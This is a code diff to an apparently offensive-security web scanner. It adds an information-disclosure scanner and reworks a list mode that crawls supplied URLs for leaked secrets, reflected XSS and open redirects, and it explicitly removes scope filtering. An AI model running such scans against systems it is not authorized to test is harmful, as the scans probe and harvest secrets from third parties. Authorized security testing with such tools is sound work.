-    with open(crawl_file, "w") as f:
-        f.write("\n".join(sorted(urls)) + "\n")
-    log.success(f"URLs saved → {crawl_file}")
+        if is_js:
+            dedup_key = f"{parsed.netloc}{parsed.path}"
+            if dedup_key not in seen:
+                seen.add(dedup_key)
+                js_urls.append(u)
+        elif has_qs:
+            if u not in seen:
+                seen.add(u)
+                page_param.append(u)
+        else:
+            dedup_key = f"{parsed.netloc}{parsed.path}"
+            if dedup_key not in seen:
+                seen.add(dedup_key)
+                page_noparam.append(u)
 
-    # ── Step 1: Extract endpoints from JS ─────────────────────────────
-    ep = EndpointExtractor(log)
-    log.section("STEP 1: Extracting Endpoints from JS")
-    def do_extract(url):
-        try:
-            r = session.get(url, timeout=10)
-            if r.status_code == 200:
-                ep.extract(r.text, url, url)
-        except Exception:
-            pass
-    with ThreadPoolExecutor(max_workers=args.workers) as ex:
-        list(ex.map(do_extract, js_urls[:300]))
-    page_urls_all = list(set(page_urls) | ep.all_urls)
-    ep.print_summary()
-    if ep.endpoints:
-        ep_file = out_dir / "endpoints.txt"
-        with open(ep_file, "w") as f:
-            f.write("\n".join(sorted(ep.endpoints)) + "\n")
-        log.success(f"Endpoints saved → {ep_file}")
+    log.success(
+        f"Categorised: {len(js_urls)} JS | "
+        f"{len(page_param)} pages with params | "
+        f"{len(page_noparam)} pages without params"
+    )
 
-    # ── Step 2: Secret Scanning ────────────────────────────────────────
-    scanner = SecretScanner(log, session, target_domain=domain)
-    all_targets = js_urls + [u for u in page_urls if u not in js_urls]
+    # ── STEP 1: Secret Scanning ───────────────────────────────────────
+    log.section("STEP 1: Secret Scanning")
+    all_targets = js_urls + page_param + page_noparam
+    log.info(f"Scanning {len(all_targets)} URLs for secrets…")
+    scanner = SecretScanner(log, session, target_domain="")
+    scanner.target_domain = ""   # no scope filter — user owns the list
     scanner.scan_parallel(all_targets, workers=args.workers)
 
-    # ── Step 3: XSS Scanning ──────────────────────────────────────────
+    # ── STEP 2: XSS Scanning ─────────────────────────────────────────
+    ep = EndpointExtractor(log)
     if not args.no_xss:
-        if page_urls_all:
-            XSSScanner(log, session, target_domain=domain).scan_urls(
-                page_urls_all[:500], workers=args.workers)
-        else:
-            log.warn("No page URLs with params found for XSS testing")
+        log.section("STEP 2: XSS Scanning")
+        # Extract extra parameterised URLs from JS files
+        if js_urls:
+            log.info(f"Extracting endpoints from {min(len(js_urls),200)} JS files…")
+            def _ep(url):
+                try:
+                    r = session.get(url, timeout=10)
+                    if r.status_code == 200:
+                        ep.extract(r.text, url, url)
+                except Exception:
+                    pass
+            with ThreadPoolExecutor(max_workers=args.workers) as ex:
+                list(ex.map(_ep, js_urls[:200]))
 
-    # ── Step 4: Open Redirect Scanning ────────────────────────────────
-    if not args.no_redirect:
-        if page_urls_all:
-            RedirectScanner(log, session, domain).scan_urls(
-                page_urls_all[:500], workers=args.workers)
+        xss_targets = list(dict.fromkeys(page_param + list(ep.all_urls)))
+        if xss_targets:
+            log.info(f"{len(xss_targets)} URLs with params for XSS testing")
+            xss_scanner = XSSScanner(log, session, target_domain="")
+            xss_scanner.target_domain = ""
+            xss_scanner.scan_urls(xss_targets[:1000], workers=args.workers)
         else:
-            log.warn("No page URLs found for redirect testing")
+            log.warn("No URLs with query params found — XSS skipped")
+            log.warn("Tip: ensure your list contains URLs with ?param=value")
+
+    # ── STEP 3: Open Redirect Scanning ───────────────────────────────
+    if not args.no_redirect:
+        log.section("STEP 3: Open Redirect Scanning")
+        redir_targets = list(dict.fromkeys(page_param + list(ep.all_urls)))
+        if redir_targets:
+            redir_scanner = RedirectScanner(log, session, primary_domain)
+            redir_scanner.target = ""   # no scope filter
+            redir_scanner.scan_urls(redir_targets[:1000], workers=args.workers)
+        else:
+            log.warn("No URLs with params found for redirect testing")
+
+    # ── STEP 4: Information Disclosure ────────────────────────────────
+    if not getattr(args, "no_info", False):
+        id_scanner = InfoDisclosureScanner(log, session)
+        id_scanner.probe_paths(primary_domain, workers=args.workers)
+        id_scanner.scan_collected_urls(
+            list(set(page_param + page_noparam))[:300], workers=args.workers
+        )
 
     # ── Summary ───────────────────────────────────────────────────────
-    log.section("SCAN COMPLETE")
+    log.section("SCAN COMPLETE — LIST MODE")
     ns = len(log.findings)
     nx = len(log.xss)
     nr = len(log.redirs)
+    ni = len(log.info_disc)
 
-    if ns == nx == nr == 0:
+    if ns == nx == nr == ni == 0:
         print(f"{G}  Nothing found{RESET}")
+        print(f"{DIM}  Tip: ensure your list has URLs with ?param=value for XSS/redirect tests{RESET}")
     else:
-        if ns: print(f"{R}{BOLD}  🔑 {ns} secret(s){RESET}")
+        if ns:
+            print(f"{R}{BOLD}  🔑 {ns} secret(s){RESET}")
+            by_sev = {}
+            for f in log.findings:
+                by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
+            for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
+                if sev in by_sev:
+                    print(f"     {SEV_COLOR[sev]}[{sev}]{RESET} {by_sev[sev]}")
         if nx: print(f"{R}{BOLD}  ⚡ {nx} XSS finding(s){RESET}")
-        if nr: print(f"{BR}{BOLD}  ↩  {nr} open redirect finding(s){RESET}")
+        if nr: print(f"{BR}{BOLD}  ↩  {nr} open redirect(s){RESET}")
+        if ni: print(f"{Y}{BOLD}  🔍 {ni} information disclosure finding(s){RESET}")
 
     print(f"\n  {DIM}Files scanned: {scanner.scanned}{RESET}")
     print(f"  {DIM}Output dir   : {out_dir}/{RESET}")
-    log.save(domain, ts)
+    log.save(primary_domain, ts)
     print(f"\n{M}{BOLD}  Done! 🎯{RESET}\n")
 
 
@@ -2462,13 +2744,21 @@ def run_scan(args):
         else:
             log.warn("No page URLs found for redirect testing")
 
+    # ── 6. Information Disclosure Scanning ────────
+    if not getattr(args, "no_info", False):
+        id_scanner = InfoDisclosureScanner(log, session)
+        for d in scan_domains[:5]:
+            id_scanner.probe_paths(d, workers=args.workers)
+        id_scanner.scan_collected_urls(list(all_pages)[:300], workers=args.workers)
+
     # ── Summary ────────────────────────────────────
     log.section("SCAN COMPLETE")
     ns = len(log.findings)
     nx = len(log.xss)
     nr = len(log.redirs)
+    ni = len(log.info_disc)
 
-    if ns == nx == nr == 0:
+    if ns == nx == nr == ni == 0:
         print(f"{G}  Nothing found (target may be clean — try --deep){RESET}")
     else:
         if ns:
@@ -2483,6 +2773,8 @@ def run_scan(args):
             print(f"{R}{BOLD}  ⚡ {nx} reflected XSS finding(s){RESET}")
         if nr:
             print(f"{BR}{BOLD}  ↩  {nr} open redirect finding(s){RESET}")
+        if ni:
+            print(f"{Y}{BOLD}  🔍 {ni} information disclosure finding(s){RESET}")
 
     print(f"\n  {DIM}JS scanned  : {scanner.scanned}{RESET}")
     print(f"  {DIM}Endpoints   : {len(ep.endpoints)}{RESET}")
@@ -2496,7 +2788,7 @@ def run_scan(args):
 #  CLI
 # ─────────────────────────────────────────────
 
-VERSION = "2.0.0"
+VERSION = "2.1.0"
 
 def main():
     p = argparse.ArgumentParser(
@@ -2534,6 +2826,7 @@ Examples:
     p.add_argument("--subs",        action="store_true", help="Enumerate subdomains (with -d)")
     p.add_argument("--no-xss",      action="store_true", help="Skip XSS scanning")
     p.add_argument("--no-redirect", action="store_true", help="Skip open redirect scanning")
+    p.add_argument("--no-info",     action="store_true", help="Skip information disclosure scanning")
     p.add_argument("-c","--cookies", help="Cookie string")
     p.add_argument("-H","--headers", nargs="+",          help="Extra headers")
     p.add_argument("-p","--proxy",   help="Proxy URL (e.g. http://127.0.0.1:8080)")
